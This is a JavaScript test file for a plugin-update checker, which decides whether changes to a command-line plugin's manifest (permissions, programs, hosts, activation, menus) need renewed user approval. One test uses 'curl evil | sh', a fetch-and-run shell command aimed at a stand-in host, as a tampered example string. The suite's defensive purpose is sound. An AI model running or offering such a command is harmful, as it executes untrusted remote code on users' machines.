import assert from "node:assert/strict";
import { test } from "node:test";
const { readManifest } = await import("../../lib/pluginManifest.ts");
const { updateWithin, UPDATE_PROMPT_REASONS } = await import("./officialUpdate.ts");

const parse = (doc) => {
  const read = readManifest(JSON.stringify(doc));
  assert.deepEqual(read.problems, [], JSON.stringify(doc));
  return read.manifest;
};

const AFTER_UPDATE = [["skills", "install", "--auto"], ["skills", "refresh"], ["computer", "refresh"]];
const CLI_040 = {
  manifest: 1, name: "cli", title: "Command Line", description: "Drive Ardia from your terminal or an agent.", version: "0.4.0", icon: "terminal.fill",
  alwaysOn: true, official: true, permissions: ["control"], programs: [{ name: "ardia", path: "bin/ardia", afterUpdate: AFTER_UPDATE }],
};
const CLI_060 = {
  manifest: 2, name: "cli", title: "Command Line", description: "Drive Ardia from your terminal or an agent.", version: "0.6.0", requires: "0.2.48", icon: "terminal.fill",
  keywords: ["command line", "terminal"], alwaysOn: true, official: true, main: "dist/main.js", permissions: { control: true },
  contributes: {
    commands: [{ name: "show-status", title: "Command Line: Show Status", icon: "terminal", view: "status", keywords: ["ardia"] }],
    programs: [{ name: "ardia", path: "bin/ardia", claim: true, example: "ardia tabs", afterUpdate: AFTER_UPDATE }],
  },
  telemetry: { title: "The ardia command", items: ["Each command's name"] },
};
const v2 = (version, extra = {}, contributes = {}) => ({ ...CLI_060, version, ...extra, contributes: { ...CLI_060.contributes, ...contributes } });

const from040 = (next) => updateWithin(parse(CLI_040), next, "ardia tabs");
test("a first main reachable only from the command bar, with permissions that give it nothing, passes silently and is flagged as a new runtime", () => {
  const verdict = from040(parse(CLI_060));
  assert.equal(verdict.ok, true);
  assert.equal(verdict.runtime, true, "the note says it added code");
  assert.equal(updateWithin(parse(CLI_060), parse(v2("0.7.0"))).runtime, false, "an existing main isn't new");
});

const firstMainWith = (extra = {}, contributes = {}) => from040(parse(v2("0.6.0", extra, contributes)));
const firstMainRefusals = [
  ["a startup activation", { activationEvents: ["onStartupFinished"] }, {}],
  ["every event", { activationEvents: ["*"] }, {}],
  ["a URL activation", { activationEvents: ["onUrl:example.com"] }, {}],
  ["an event activation", { activationEvents: ["onEvent:tab.created"] }, {}],
  ["a sidebar view", {}, { sidebarViews: [{ id: "side", title: "Side", icon: "terminal" }] }],
  ["a toolbar button", {}, { toolbar: [{ id: "tb", title: "Status", icon: "terminal", command: "show-status" }] }],
  ["a menu entry", {}, { menus: { tab: [{ command: "show-status" }] } }],
  ["an omnibox provider", {}, { omnibox: [{ id: "o", title: "O", keyword: "st" }] }],
  ["a panel", {}, { panels: [{ id: "default", title: "P", icon: "doc", mode: "tab", file: "p.html" }] }],
  ["a tool", {}, { tools: [{ name: "peek", title: "Peek", description: "d" }] }],
  ["a hook", {}, { hooks: ["tab.created"] }],
];
for (const [what, extra, contributes] of firstMainRefusals) {
  test(`a first main with ${what} prompts`, () => assert.equal(firstMainWith(extra, contributes).ok, false));
}
const grants = [
  ["tabs read", { tabs: "read" }],
  ["full URLs", { tabs: "read", fullUrls: true }],
  ["the active page", { activePage: true }],
  ["commands", { commands: true }],
  ["storage", { storage: true }],
  ["secrets", { secrets: true }],
  ["a network host", { network: ["api.example.com"] }],
  ["every site", { network: "*" }],
];
for (const [what, granted] of grants) {
  test(`a first main with ${what} prompts, even when 0.4.0 had already declared it`, () => {
    const permissions = { control: true, ...granted };
    const before = { ...CLI_040, manifest: 2, permissions, contributes: { programs: [{ name: "ardia", path: "bin/ardia", afterUpdate: AFTER_UPDATE }] } };
    delete before.programs;
    assert.deepEqual(updateWithin(parse(before), parse(v2("0.6.0", { permissions })), "ardia tabs"), { ok: false, reason: "runtime" });
  });
}

test("a program's example must stay what Settings offers to copy: the pin's fallback counts for a manifest without one", () => {
  assert.equal(from040(parse(CLI_060)).ok, true, "0.4.0 had none, so the pin's ardia tabs; 0.6.0 says ardia tabs");
  const other = parse(v2("0.7.0", {}, { programs: [{ name: "ardia", path: "bin/ardia", claim: true, example: "curl evil | sh", afterUpdate: AFTER_UPDATE }] }));
  assert.deepEqual(updateWithin(parse(CLI_060), other, "ardia tabs"), { ok: false, reason: "programs" });
});

test("round 5: the example is compared the way Settings picks it, and a host-order-only change adds nothing to the note", () => {
  const programs = (first) => parse(v2("0.6.0", {}, { programs: [{ name: "ardia", path: "bin/ardia", claim: true, ...(first ? { example: first } : {}), afterUpdate: AFTER_UPDATE }, { name: "ardia-help", path: "bin/h", example: "ardia-help --help" }] }));
  assert.deepEqual(updateWithin(programs(null), programs("ardia tabs"), "ardia tabs"), { ok: false, reason: "programs" }, "Settings would switch from ardia-help --help to ardia tabs");
  const hosts = (network) => parse(v2("0.6.0", { permissions: { control: true, network } }));
  assert.deepEqual(updateWithin(hosts(["b.example.com", "a.example.com"]), hosts(["a.example.com", "b.example.com"])), { ok: true, added: [], runtime: false });
});

test("an equal manifest under a new version, description, keywords and telemetry text passes, with nothing new to tell", () => {
  const verdict = updateWithin(parse(CLI_060), parse(v2("0.7.0", { description: "Changed words.", keywords: ["other"], telemetry: { title: "x", items: ["y"] } })));
  assert.deepEqual(verdict, { ok: true, added: [], runtime: false });
});

test("the Python CLI 0.4.0 to 0.6.0: same permissions, so it passes, and the note lists what's new (an on-demand sandboxed view and a command-bar entry)", () => {
  const verdict = from040(parse(CLI_060));
  assert.equal(verdict.ok, true);
  assert.ok(verdict.added.some((line) => line.includes("Adds to the command bar: Command Line: Show Status")), verdict.added.join("\n"));
  assert.ok(verdict.added.some((line) => line.startsWith("Runs its code in Ardia's plugin sandbox, starting the first time you use it")), verdict.added.join("\n"));
  assert.ok(!verdict.added.some((line) => line.includes("PATH")), "PATH lines were already approved");
});

test("permissions must stay the same: narrowing prompts too, since it changes which other plugins may call its tools; reordered hosts don't count", () => {
  const wide = parse(v2("0.6.0", { permissions: { control: true, network: ["api.example.com", "*.example.org"], tabs: "write" } }));
  assert.deepEqual(updateWithin(wide, parse(v2("0.7.0", { permissions: { control: true, network: ["api.example.com", "*.example.org"], tabs: "read" } }))), { ok: false, reason: "permissions" });
  assert.deepEqual(updateWithin(wide, parse(v2("0.7.0", { permissions: { control: true, network: ["api.example.com"], tabs: "write" } }))), { ok: false, reason: "network" });
  assert.deepEqual(updateWithin(wide, parse(v2("0.7.0", { permissions: { network: ["api.example.com", "*.example.org"], tabs: "write" } }))), { ok: false, reason: "permissions" });
  assert.equal(updateWithin(wide, parse(v2("0.7.0", { permissions: { control: true, network: ["*.example.org", "api.example.com"], tabs: "write" } }))).ok, true, "reordered hosts");
});

test("what runs must stay identical: programs and their after-update steps, in order and count", () => {
  const steps = (afterUpdate) => parse(v2("0.7.0", {}, { programs: [{ name: "ardia", path: "bin/ardia", claim: true, afterUpdate }] }));
  const a = parse(CLI_060);
  assert.deepEqual(updateWithin(a, steps([...AFTER_UPDATE].reverse())), { ok: false, reason: "programs" }, "reordered");
  assert.deepEqual(updateWithin(a, steps([AFTER_UPDATE[0], ...AFTER_UPDATE])), { ok: false, reason: "programs" }, "an approved step run twice");
  assert.deepEqual(updateWithin(a, steps([AFTER_UPDATE[0], AFTER_UPDATE[2]])), { ok: false, reason: "programs" }, "a dropped step changes what runs after it");
  assert.deepEqual(updateWithin(a, parse(v2("0.7.0", {}, { programs: [] }))), { ok: false, reason: "programs" });
  const two = (order) => parse(v2("0.6.0", {}, { programs: order.map((name) => ({ name, path: `bin/${name}`, afterUpdate: [["setup"]] })) }));
  assert.deepEqual(updateWithin(two(["ardia", "ardia-x"]), two(["ardia-x", "ardia"])), { ok: false, reason: "programs" }, "two programs swapped");
});

test("a program whose path changes prompts, since after-update steps run the binary at that path", () => {
  const moved = parse(v2("0.7.0", {}, { programs: [{ name: "ardia", path: "bin/other", claim: true, afterUpdate: AFTER_UPDATE }] }));
  assert.deepEqual(updateWithin(parse(CLI_060), moved), { ok: false, reason: "programs" });
});

test("a command kept under the same name must keep its action and when clause, so a menu entry can't start handing context to code", () => {
  const menuBase = { main: "dist/main.js", permissions: { control: true } };
  const withMenu = (command) => v2("0.6.0", menuBase, { commands: [command], menus: { group: [{ command: "show-status" }] } });
  const view = { name: "show-status", title: "Command Line: Show Status", icon: "terminal", view: "status" };
  const a = parse(withMenu(view));
  assert.equal(updateWithin(a, parse(withMenu(view))).ok, true);
  assert.deepEqual(updateWithin(a, parse(withMenu({ name: "show-status", title: "Command Line: Show Status", icon: "terminal", handler: true }))), { ok: false, reason: "contributions" });
  assert.deepEqual(updateWithin(a, parse(withMenu({ ...view, when: "!isPinned" }))), { ok: false, reason: "contributions" });
});

test("settings defaults must stay exactly the same, since a dropped default stays applied until the plugin is turned off", () => {
  const a = parse(v2("0.6.0", {}, { settings: { defaults: { cliControl: true } } }));
  assert.deepEqual(updateWithin(a, parse(v2("0.7.0"))), { ok: false, reason: "settings" });
  assert.equal(updateWithin(a, parse(v2("0.7.0", {}, { settings: { defaults: { cliControl: true } } }))).ok, true);
});

test("a first main only counts as on demand when the command bar is its only way in: not with a page, panels, menus, toolbar, omnibox or tools", () => {
  const { main: _main, ...noMain } = CLI_060;
  const pageBase = { ...noMain, contributes: { ...CLI_060.contributes, commands: [], panels: [{ id: "default", title: "Status", icon: "terminal", mode: "tab", file: "page/index.html" }] } };
  const a = parse(pageBase);
  const withMain = parse({ ...pageBase, version: "0.7.0", main: "dist/main.js" });
  assert.deepEqual(updateWithin(a, withMain), { ok: false, reason: "runtime" }, "a restored page would wake it");
});

const broader = [
  ["a new permission", v2("0.7.0", { permissions: { control: true, storage: true } }), "permissions"],
  ["tabs read to write", v2("0.7.0", { permissions: { control: true, tabs: "write" } }), "permissions", { permissions: { control: true, tabs: "read" } }],
  ["no network to a host", v2("0.7.0", { permissions: { control: true, network: ["api.example.com"] } }), "network"],
  ["a host to every site", v2("0.7.0", { permissions: { control: true, network: "*" } }), "network", { permissions: { control: true, network: ["api.example.com"] } }],
  ["a host outside the approved pattern", v2("0.7.0", { permissions: { control: true, network: ["evil.example.net"] } }), "network", { permissions: { control: true, network: ["*.example.com"] } }],
  ["a new program on PATH", v2("0.7.0", {}, { programs: [...CLI_060.contributes.programs, { name: "ardia-helper", path: "bin/h" }] }), "programs"],
  ["a new after-update action", v2("0.7.0", {}, { programs: [{ name: "ardia", path: "bin/ardia", claim: true, afterUpdate: [...AFTER_UPDATE, ["daemon", "start"]] }] }), "programs"],
  ["a new hook", v2("0.7.0", { activationEvents: ["onStartupFinished"] }, { hooks: ["tab.created"] }), "hooks", { activationEvents: ["onStartupFinished"] }],
  ["a new hook that would also start it in the background", v2("0.7.0", {}, { hooks: ["tab.created"] }), "activation"],
  ["code that starts in the background", v2("0.7.0", { activationEvents: ["onStartupFinished"] }), "activation"],
  ["a URL activation", v2("0.7.0", { activationEvents: ["onUrl:example.com"] }), "activation"],
  ["a settings default it writes", v2("0.7.0", {}, { settings: { defaults: { cliControl: true } } }), "settings"],
  ["a new toolbar button", v2("0.7.0", {}, { toolbar: [{ id: "status", title: "Status", icon: "terminal", command: "show-status" }] }), "activation"],
  ["a new tool offered to other programs", v2("0.7.0", {}, { tools: [{ name: "peek", title: "Peek", description: "d" }] }), "contributions"],
];

for (const [what, next, reason, base] of broader) {
  test(`broader prompts: ${what}`, () => {
    const verdict = updateWithin(parse(base ? v2("0.6.0", base) : CLI_060), parse(next));
    assert.deepEqual(verdict, { ok: false, reason });
  });
}

test("a sidecar that wasn't approved, or a changed sidecar command, prompts", () => {
  const plain = { manifest: 2, name: "cli", title: "Command Line", version: "0.6.0", official: true, permissions: { control: true } };
  assert.deepEqual(updateWithin(parse(plain), parse({ ...plain, version: "0.7.0", sidecar: { run: ["bin/daemon"] } })), { ok: false, reason: "runtime" });
  assert.deepEqual(updateWithin(parse({ ...plain, sidecar: { run: ["bin/daemon"] } }), parse({ ...plain, version: "0.7.0", sidecar: { run: ["bin/daemon", "--listen"] } })), { ok: false, reason: "runtime" });
  assert.equal(updateWithin(parse({ ...plain, sidecar: { run: ["bin/daemon"] } }), parse({ ...plain, version: "0.7.0", sidecar: { run: ["bin/daemon"] } })).ok, true);
});

test("a new main that would start by itself prompts, an on-demand one doesn't", () => {
  assert.deepEqual(from040(parse(v2("0.6.0", { activationEvents: ["*"] }))), { ok: false, reason: "runtime" });
  assert.equal(from040(parse(v2("0.6.0", { activationEvents: ["onCommand:show-status"] }))).ok, true);
});

test("a field the comparison doesn't know prompts: unknown manifest, permission and contribution keys", () => {
  const a = parse(CLI_060);
  assert.deepEqual(updateWithin(a, { ...parse(v2("0.7.0")), futureGrant: true }), { ok: false, reason: "unknown" });
  assert.deepEqual(updateWithin(a, { ...parse(v2("0.7.0")), permissions: { ...a.permissions, camera: true } }), { ok: false, reason: "unknown" });
  const next = parse(v2("0.7.0"));
  assert.deepEqual(updateWithin(a, { ...next, contributes: { ...next.contributes, keybindings: [] } }), { ok: false, reason: "unknown" });
  assert.deepEqual(updateWithin({ ...a, oldOnly: 1 }, next), { ok: false, reason: "unknown" });
  assert.equal(updateWithin(a, { ...next, activationEvents: ["onSomethingNew:x"] }).ok, false);
});

test("round 2: order, resolved targets, limits and row defaults that change behaviour all prompt", () => {
  const status = { name: "show-status", title: "Status", icon: "terminal", handler: true };
  const menus = (entries) => parse(v2("0.6.0", {}, { commands: [status], menus: { tab: entries } }));
  const pinnedFirst = [{ command: "show-status", when: "isPinned" }, { command: "show-status" }];
  assert.equal(updateWithin(menus(pinnedFirst), menus(pinnedFirst)).ok, true);
  assert.deepEqual(updateWithin(menus(pinnedFirst), menus([...pinnedFirst].reverse())), { ok: false, reason: "contributions" }, "menu entries reordered");
  assert.deepEqual(updateWithin(menus(pinnedFirst), menus([pinnedFirst[1]])), { ok: false, reason: "contributions" }, "the restricting entry dropped");

  const panel = (id) => ({ id, title: id, icon: "doc", mode: "tab", file: `${id}.html` });
  const pages = (ids, extra = []) => parse(v2("0.6.0", { permissions: { control: true, tabs: "read" } }, { commands: [{ name: "open-it", title: "Open", icon: "doc", open: "split", context: true }, ...extra], panels: ids.map(panel) }));
  assert.equal(updateWithin(pages(["one", "two"]), pages(["one", "two"])).ok, true);
  assert.deepEqual(updateWithin(pages(["one", "two"]), pages(["two", "one"])), { ok: false, reason: "contributions" }, "panels reordered change where the tab goes");
  assert.deepEqual(updateWithin(pages(["one", "two"]), pages(["one", "two"], [{ name: "open-two", title: "Two", icon: "doc", open: "tab", path: "/two" }])), { ok: false, reason: "contributions" }, "a new open command");

  const eager = (events) => parse(v2("0.6.0", { activationEvents: events }));
  assert.deepEqual(updateWithin(eager(["*"]), eager(["*", "onUrl:example.com"])), { ok: false, reason: "activation" }, "* doesn't cover a new URL trigger");

  assert.deepEqual(updateWithin(parse(CLI_060), parse(v2("0.7.0", { memoryMB: 2048 }))), { ok: false, reason: "runtime" }, "a bigger memory budget for main");
  const plain = { manifest: 2, name: "cli", title: "Command Line", version: "0.6.0", official: true, permissions: { control: true } };
  assert.deepEqual(updateWithin(parse({ ...plain, sidecar: { run: ["bin/d"] } }), parse({ ...plain, version: "0.7.0", sidecar: { run: ["bin/d"], memoryMB: 2048 } })), { ok: false, reason: "runtime" }, "a bigger sidecar budget");

  const tool = (timeout) => parse(v2("0.6.0", {}, { tools: [{ name: "peek", title: "Peek", description: "d", timeout }] }));
  assert.deepEqual(updateWithin(tool(1), tool(300)), { ok: false, reason: "contributions" }, "a longer tool timeout");

  const row = (value) => parse(v2("0.6.0", {}, { settings: { rows: [{ key: "local", type: "toggle", title: "Local", default: value }] } }));
  assert.deepEqual(updateWithin(row(false), row(true)), { ok: false, reason: "settings" }, "a row default flipped");
});

test("new commands come in only with a first main reachable from nowhere else, and only when the permissions give it nothing to use", () => {
  const ping = { name: "ping", title: "Ping", icon: "bolt", handler: true };
  assert.equal(from040(parse(v2("0.6.0", {}, { commands: [...CLI_060.contributes.commands, ping] }))).ok, true, "with the first main");
  assert.deepEqual(updateWithin(parse(CLI_060), parse(v2("0.7.0", {}, { commands: [...CLI_060.contributes.commands, ping] }))), { ok: false, reason: "contributions" }, "an existing main gets no new way in");
  const renamed = parse(v2("0.7.0", {}, { commands: [{ ...CLI_060.contributes.commands[0], title: "Other" }] }));
  assert.deepEqual(updateWithin(parse(CLI_060), renamed), { ok: false, reason: "contributions" }, "a kept command must stay as it was");
});

test("round 3: a first main can't put dormant permissions to use, and an existing main can't gain a command that reaches other pages", () => {
  const dormant = { ...CLI_040, permissions: { control: true, network: ["api.example.com"] }, manifest: 2, programs: undefined, contributes: { programs: [{ name: "ardia", path: "bin/ardia", afterUpdate: AFTER_UPDATE }] } };
  delete dormant.programs;
  const a = parse(dormant);
  const next = parse(v2("0.6.0", { permissions: { control: true, network: ["api.example.com"] } }));
  assert.deepEqual(updateWithin(a, next), { ok: false, reason: "runtime" }, "network declared with no code to use it stays unusable without review");
  const reads = (commands) => parse(v2("0.6.0", { permissions: { control: true, tabs: "read", activePage: true } }, { commands }));
  const approved = reads([{ name: "here", title: "Here", icon: "doc", handler: true, when: "urlHost == 'example.com'" }]);
  const wider = reads([{ name: "here", title: "Here", icon: "doc", handler: true, when: "urlHost == 'example.com'" }, { name: "anywhere", title: "Anywhere", icon: "doc", handler: true }]);
  assert.deepEqual(updateWithin(approved, wider), { ok: false, reason: "contributions" });
});

test("a different name or a manifest not marked official never passes", () => {
  assert.deepEqual(updateWithin(parse(CLI_060), parse({ ...v2("0.7.0"), name: "clj" })), { ok: false, reason: "baseline" });
  const { official: _official, alwaysOn: _alwaysOn, ...unofficial } = v2("0.7.0");
  assert.deepEqual(updateWithin(parse(CLI_060), parse(unofficial)), { ok: false, reason: "baseline" });
});

test("every prompt reason has a name the telemetry counts use", () => {
  assert.deepEqual([...UPDATE_PROMPT_REASONS].sort(), ["activation", "baseline", "contributions", "hooks", "network", "permissions", "programs", "runtime", "settings", "unknown"]);
});
